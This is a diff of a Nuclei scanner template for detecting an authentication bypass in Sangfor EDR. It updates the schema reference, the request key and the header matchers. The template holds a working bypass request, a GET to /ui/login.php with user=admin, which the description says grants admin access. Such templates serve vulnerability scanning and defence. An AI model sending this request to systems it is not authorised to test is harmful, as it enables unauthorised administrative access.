@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: sangfor-edr-auth-bypass
 info:
   name: Sangfor EDR Authentication Bypass
@@ -6,7 +7,7 @@ info:
   description: A vulnerability in Sangfor EDR allows remote attackers to access the system with 'admin' privileges by accessing the login page directly using a provided username rather than going through the login screen without providing a username.
   tags: sangfor,auth-bypass,login
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/ui/login.php?user=admin"
@@ -22,9 +23,4 @@ requests:
       - type: word
         words:
           - 'Set-Cookie=""'
-        part: header
-        negative: true
-      - type: word
-        words:
-          - 'Set-Cookie='
         part: header
